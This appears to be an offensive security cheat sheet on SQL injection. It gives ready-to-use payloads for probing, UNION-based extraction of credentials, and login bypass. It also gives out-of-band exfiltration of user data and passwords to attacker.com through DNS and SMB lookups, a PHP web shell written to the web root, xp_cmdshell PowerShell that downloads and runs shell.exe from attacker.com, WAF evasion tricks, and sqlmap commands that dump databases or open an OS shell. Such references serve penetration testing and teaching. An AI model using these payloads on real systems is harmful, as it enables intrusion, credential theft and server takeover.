# SQL Injection (SQLi)

## Overview
SQL Injection occurs when untrusted user input is directly concatenated into a backend database query without proper sanitization or parameterization. This allows an attacker to manipulate the structure of the SQL query to bypass authentication, read unauthorized data, modify records, or execute arbitrary code on the database server.

## When This Happens
- User input is concatenated into queries: `SELECT * FROM users WHERE username = '` + $_GET['user'] + `'`
- Prepared statements are used incorrectly, or specific fields (like `ORDER BY` or `LIMIT`) are not parameterized.
- Data from secondary sources (like HTTP headers or databases) is trusted without validation (Second-Order SQLi).

---

## Recon / Detection

### 1. Identify Input Vectors
Test all parameters that might interact with a database:
- URL parameters (`?id=1`)
- Form fields (login, search)
- JSON/XML body fields
- HTTP Headers (`User-Agent`, `X-Forwarded-For`, `Referer` — especially for logging)
- Cookies

### 2. Error-Based Probing
Inject characters that disrupt SQL syntax to trigger error messages:
```text
'
"
`
\
;'
```
**Look for:** Stack traces, "Syntax error", "SQL syntax", "ORA-", "PostgreSQL query failed", "Unclosed quotation mark".

### 3. Boolean/Logic Probing (Blind)
Inject logic and observe if the response changes:
```sql
-- Original
?id=1

-- True condition (should return normal page)
?id=1 AND 1=1
?id=1' AND '1'='1

-- False condition (should return empty page or error)
?id=1 AND 1=2
?id=1' AND '1'='2
```

### 4. Time-Based Probing (Blind)
If there is no visible response difference, inject a delay:
```sql
-- MySQL
?id=1' AND SLEEP(5)-- -

-- PostgreSQL
?id=1' AND pg_sleep(5)-- -

-- MSSQL
?id=1'; WAITFOR DELAY '0:0:5'-- -

-- Oracle
?id=1' AND 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1)-- -
```

---

## Exploitation Steps (UNION-Based SQLi)

When the results of the injected query are reflected directly in the HTML response.

### Step 1: Determine the number of columns
Use `ORDER BY` until an error occurs (or the page behaves differently).
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -  <-- If this throws an error, there are 3 columns.
```

### Step 2: Determine which columns are displayed
Use `UNION SELECT` with the identified number of columns.
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT 'A','B','C'-- -
```
If "2" appears on the page, the second column is vulnerable for extraction.

### Step 3: Fingerprint the database version
Extract the DB version to know the syntax to use.
```sql
-- MySQL / MSSQL (sometimes)
' UNION SELECT 1,@@version,3-- -

-- PostgreSQL
' UNION SELECT 1,version(),3-- -

-- Oracle
' UNION SELECT 1,banner,3 FROM v$version-- -
```

### Step 4: Extract Database Names
```sql
-- MySQL / PostgreSQL
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata-- -

-- Extract current DB
' UNION SELECT 1,database(),3-- -
```

### Step 5: Extract Table Names
```sql
-- MySQL / PostgreSQL
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema = database()-- -
```

### Step 6: Extract Column Names
```sql
-- MySQL / PostgreSQL
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name = 'users'-- -
```

### Step 7: Extract Data
Group concatenation is useful for extracting multiple rows at once.
```sql
-- MySQL / PostgreSQL
' UNION SELECT 1,group_concat(username, ':', password),3 FROM users-- -
```

---

## Exploitation Techniques

### 1. Authentication Bypass
Bypass login forms by injecting into the `username` field.
```sql
admin'--
admin' #
admin'/*
' OR 1=1--
' OR '1'='1
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'--
```

### 2. Time-Based Blind Extraction (Manual Example)
If it's blind, extract character by character using binary search scripts or `sqlmap`. manually, it looks like this:
```sql
-- Is the first letter of the DB name 'A'? (If yes, it pauses for 5 seconds)
?id=1' AND IF(SUBSTRING(database(),1,1)='A', SLEEP(5), 0)-- -
```

### 3. Out-of-Band (OOB) SQLi
Send the data via DNS resolution to a server you control (e.g., Burp Collaborator or interactsh).
```sql
-- Oracle
SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT USER)||'.attacker.com/"> %remote;]>'),'/l') FROM dual;

-- PostgreSQL
COPY (SELECT username FROM users LIMIT 1) TO PROGRAM 'nslookup '||(SELECT username FROM users LIMIT 1)||'.attacker.com';

-- MSSQL
DECLARE @host varchar(1024);
SELECT @host = (SELECT password FROM users WHERE id=1) + '.attacker.com';
EXEC('master..xp_dirtree "\\' + @host + '\foobar$"');
```

---

## Escalation to Remote Code Execution (RCE)

### MySQL: INTO OUTFILE
If the DB user has `FILE` privileges and you know the web root path:
```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>',2,3 INTO OUTFILE '/var/www/html/shell.php'-- -
```
Access via `http://target.com/shell.php?cmd=whoami`.

### MSSQL: xp_cmdshell
If `xp_cmdshell` is enabled (or you have SA privileges to enable it).
```sql
-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

-- Execute commands
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/shell.exe -OutFile C:\\Windows\\Temp\\shell.exe; C:\\Windows\\Temp\\shell.exe"';--
```

### PostgreSQL: COPY TO PROGRAM (CVE-2019-9193)
If the DB user is a superuser (like `postgres`):
```sql
'; DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;--
```

---

## Filter Bypasses & WAF Evasion

| Filter | Bypass Technique |
|--------|-----------------|
| Space blocked | Use comments `/**/` or tabs `%09` or newlines `%0a`: `SELECT/**/username/**/FROM/**/users` |
| Quotes blocked | Use HEX: `SELECT * FROM users WHERE username = 0x61646d696e` (admin) or `CHAR(97,100,109,105,110)` |
| `OR`/`AND` blocked | Use `||` and `&&` |
| `SELECT` blocked | Case variation (`SeLeCt`), double encoding (`%2553ELECT`), inline comments (`SEL/**/ECT`) |
| `=` blocked | Use `LIKE`, `IN()`, `<>` (for not equal), `BETWEEN`, or `>` / `<` comparisons |

---

## Tools

- `sqlmap`: Automated SQL injection detection and exploitation.
  - Basic: `sqlmap -u "http://target.com/?id=1" --dbs`
  - From Burp Request: `sqlmap -r request.txt --dbms=mysql --dump`
  - Get Shell: `sqlmap -u "http://target.com/?id=1" --os-shell`
  - Bypassing WAF: `sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase`
- `Hackvertor` (Burp Extension): Excellent for rapid, on-the-fly encoding to bypass filters.
- `Turbo Intruder`: Excellent for testing Race-Condition based blind SQLi or rapid enumeration.

---

## Real-World Notes
- **Order By/Limit**: Parameters like `sort=` or `order=` often cannot be easily parameterized. To test these, use logic: `?sort=(CASE WHEN (1=1) THEN column1 ELSE column2 END)`.
- **Second-Order SQLi**: You might inject the payload when updating a user profile (`name = "admin'--" `), but the payload only triggers later when an admin views the user list.
- **Stacked Queries**: If the application uses PHP PDO `multi_query()`, you can execute multiple statements separated by `;`. This makes `UPDATE` and `DELETE` attacks much easier even if the endpoint was originally a `SELECT`.

## References
- [Exploitation Methodology](../methodology/exploitation-methodology.md)
